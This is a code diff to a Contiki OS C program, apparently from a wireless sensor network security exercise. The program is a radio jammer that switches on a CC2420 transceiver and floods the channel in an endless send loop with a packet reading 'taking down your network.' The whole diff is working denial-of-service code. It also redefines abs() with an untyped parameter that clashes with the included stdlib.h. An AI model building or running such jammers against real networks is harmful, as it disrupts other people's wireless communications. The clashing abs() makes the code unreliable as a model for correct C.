@@ -18,6 +18,7 @@
 #include <string.h>
 #include "sys/log.h"
 #include "cc2420.h"
+#include <stdlib.h>
 
 #define LOG_MODULE "App"
 #define LOG_LEVEL LOG_LEVEL_INFO
@@ -34,11 +35,20 @@ PROCESS(jammer, "jammer process");
 AUTOSTART_PROCESSES(&jammer);
 /*---------------------------------------------------------------------------*/
 
+int abs(a){
+    if(a < 0){
+        return -1*a;
+    }
+    else {
+        return a;
+    }
+}
 
 PROCESS_THREAD(jammer, ev, data)
 {   
     PROCESS_BEGIN();
-    printf("Starting jamming attack %d \n", (11 << 1));
+    printf("Starting jamming attack\n");
+
     static int channel = 11;
     NETSTACK_RADIO.on();
     //NETSTACK_RADIO.set_value(RADIO_PARAM_CCA_THRESHOLD, 0); //turning CCA off (https://sourceforge.net/p/contiki/mailman/message/34745886/)
@@ -59,13 +69,22 @@ PROCESS_THREAD(jammer, ev, data)
     strcpy(jpacket.data, "Antonio Gonga is taking down your network.");
     
 
-    //static struct etimer et;
-    //etimer_set(&et, SEND_INTERVAL);
 
+    //int send_time = 0;
+    
+    //static struct etimer et;
+    //etimer_set(&et, CLOCK_SECOND);
+    srand(107);
+
+    //send a packet at random times between 0-2 seconds
     while(1) {
         //PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&et));
         //NETSTACK_RADIO.send((void*)&jpacket, JAMMER_PACKET_LEN);
         cc2420_driver.send((void*)&jpacket, JAMMER_PACKET_LEN);
+        
+        //send_time = abs(rand() % (int)CLOCK_SECOND);
+        //printf("random time is = %d \n", send_time);
+        //etimer_set(&et, send_time);
         //etimer_reset(&et);
     }
 
